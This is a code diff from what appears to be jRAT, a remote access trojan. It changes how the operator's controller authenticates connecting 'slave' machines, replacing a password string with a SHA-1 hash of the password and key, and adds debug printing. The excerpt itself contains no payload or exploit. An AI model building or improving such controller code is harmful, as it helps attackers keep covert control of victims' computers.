@@ -19,6 +19,7 @@ import io.jrat.common.OperatingSystem;
 import io.jrat.common.Version;
 import io.jrat.common.codec.Hex;
 import io.jrat.common.crypto.Crypto;
+import io.jrat.common.hash.Sha1;
 
 import java.awt.TrayIcon;
 import java.io.BufferedReader;
@@ -29,12 +30,12 @@ import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.Random;
 
 import javax.crypto.BadPaddingException;
 import javax.swing.ImageIcon;
-
 
 @SuppressWarnings("unused")
 public class Slave implements Runnable {
@@ -143,10 +144,25 @@ public class Slave implements Runnable {
 			while (true) {
 				byte header = readByte();
 
-				if (header == 1 && connection.getPass().equals(readLine())) {
-					setVerified(true);
-					ConnectionHandler.addSlave(this);
-					continue;
+				if (header == 1) {
+					String data = connection.getPass() + "&" + Hex.encode(connection.getKey().getKey());
+
+					Sha1 sha = new Sha1();
+
+					byte[] localHash = sha.hash(data);
+					byte[] remoteHash = new byte[20];
+
+					dis.readFully(remoteHash);
+					
+					System.out.println(Hex.encode(localHash));
+					System.out.println(Hex.encode(remoteHash));
+
+					if (Arrays.equals(localHash, remoteHash)) {
+
+						setVerified(true);
+						ConnectionHandler.addSlave(this);
+						continue;
+					}
 				}
 
 				if (!isVerified()) {
@@ -166,18 +182,18 @@ public class Slave implements Runnable {
 		} catch (Exception ex) {
 			ex.printStackTrace();
 			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();
-			
+
 			PanelMainLog.instance.addEntry("Disconnect", this, message);
-			
+
 			if (ex instanceof BadPaddingException) {
 				message += ", is the encryption key matching?";
 			}
-			
+
 			try {
 				ConnectionHandler.removeSlave(this, ex);
 			} catch (Exception e) {
 			}
-			
+
 			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
 			PluginEventHandler.onDisconnect(this);
 		}
